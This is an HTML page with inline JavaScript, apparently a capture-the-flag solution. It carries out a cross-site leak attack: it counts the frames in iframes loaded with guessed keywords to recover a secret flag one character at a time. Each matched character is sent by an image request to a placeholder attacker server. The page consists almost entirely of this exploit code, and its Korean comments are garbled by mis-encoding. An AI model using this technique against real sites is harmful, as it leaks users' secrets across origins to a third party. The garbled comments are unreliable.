<!DOCTYPE html>
<body>
    <script>
        const fl = "{{ flag }}";
        const charset = [
            'a','b','c','d','e','f','g','h','i','j','k','l','m',
            'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
        ];

        charset.forEach((chr) => {
            const iframe = document.createElement("iframe");
            const url = `/iframe?keyword=` + fl + `${encodeURIComponent(chr)}`;
            iframe.src = url;
            
            iframe.onload = () => {
            let frameCount;

            try {
                // window.length === frames.length
                frameCount = iframe.contentWindow.length;
            } catch (e) {
                // cross-origin ë¬¸ì œ ë“±ìœ¼ë¡œ ì ‘ê·¼ ë¶ˆê°€í•œ ê²½ìš° ê·¸ëƒ¥ ì¢…ë£Œ
                document.body.removeChild(iframe);
                return;
            }

            // ğŸ”¹ í”„ë ˆì„ ìˆ˜ê°€ 1 ì´ìƒì´ë©´ ê³µê²©ì ì„œë²„ë¡œ ë¬¸ì ì „ì†¡
            if (frameCount >= 1) {
                const img = new Image();
                img.src = `ê³µê²©ì?flag=${encodeURIComponent(chr)}`;
            }

            // ë„ˆë¬´ ë§ì´ ìŒ“ì´ì§€ ì•Šë„ë¡ iframe ì œê±°
            document.body.removeChild(iframe);
            };

            document.body.appendChild(iframe);
        });
    </script>

</body>